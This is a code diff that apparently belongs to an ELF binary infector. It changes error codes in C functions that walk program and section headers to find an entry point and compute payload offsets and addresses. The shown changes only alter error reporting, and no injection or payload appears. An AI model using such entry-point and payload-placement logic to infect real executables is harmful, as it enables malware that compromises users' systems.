@@ -20,7 +20,7 @@ static bool	find_phdr(struct safe_ptr ref, const size_t offset,
 	Elf64_Phdr	*seg_hdr = safe(ref, offset, sizeof(Elf64_Phdr));
 
 	if (seg_hdr == NULL)
-		return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);
+		return errors(ERR_FILE, _ERR_F_READ_PHDR, _ERR_T_FIND_PHDR);
 
 	const uint32_t		p_type  = seg_hdr->p_type;
 	const uint32_t		p_flags = seg_hdr->p_flags;
@@ -44,12 +44,12 @@ static bool	find_shdr(struct safe_ptr ref, const size_t offset,
 	Elf64_Shdr	*sect_hdr = safe(ref, offset, sizeof(Elf64_Shdr));
 
 	if (sect_hdr == NULL)
-		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);
+		return errors(ERR_FILE, _ERR_F_READ_EHDR, _ERR_T_FIND_SHDR);
 
 	struct data	*closure = data;
 
 	if (!closure->safe_entry_phdr)
-		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);
+		return errors(ERR_FILE, _ERR_F_MANDATORY_FIELDS, _ERR_T_FIND_SHDR);
 
 	const Elf64_Addr	stored_sh_addr = closure->safe_low_shdr ?
 					closure->safe_low_shdr->sh_addr : ~0ull;
@@ -85,7 +85,7 @@ static bool	setup_entry(struct entry *entry,
 	Elf64_Addr	e_entry          = closure->e_entry;
 
 	if (!safe_entry_phdr || !safe_entry_shdr || !safe_low_shdr)
-		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);
+		return errors(ERR_FILE, _ERR_F_MANDATORY_FIELDS, _ERR_T_SETUP_ENTRY);
 
 	const Elf64_Off		entry_sh_offset = safe_entry_shdr->sh_offset;
 	const Elf64_Addr	entry_sh_addr   = safe_entry_shdr->sh_addr;
@@ -104,7 +104,7 @@ static bool	setup_entry(struct entry *entry,
 	if (entry->safe_phdr   == NULL || entry->safe_shdr      == NULL
 	|| entry->entry_offset == 0    || entry->payload_offset == 0
 	|| entry->entry_addr   == 0    || entry->payload_addr   == 0)
-		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);
+		return errors(ERR_FILE, _ERR_F_MANDATORY_FIELDS, _ERR_T_SETUP_ENTRY);
 
 	return true;
 }
@@ -115,7 +115,7 @@ bool		find_entry(struct entry *entry, struct safe_ptr ref)
 	Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
 
 	if (elf_hdr == NULL)
-		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);
+		return errors(ERR_FILE, _ERR_F_READ_EHDR, _ERR_T_FIND_ENTRY);
 
 	bzero(entry, sizeof(*entry));
 	bzero(&closure, sizeof(closure));
@@ -124,7 +124,7 @@ bool		find_entry(struct entry *entry, struct safe_ptr ref)
 	if (!foreach_phdr(ref, find_phdr, &closure)
 	|| !foreach_shdr(ref, find_shdr, &closure)
 	|| !setup_entry(entry, &closure))
-		return errors(ERR_THROW, _ERR_T_FIND_ENTRY);
+		return errors(ERR_THROW, _ERR_NO, _ERR_T_FIND_ENTRY);
 
 	return true;
 }
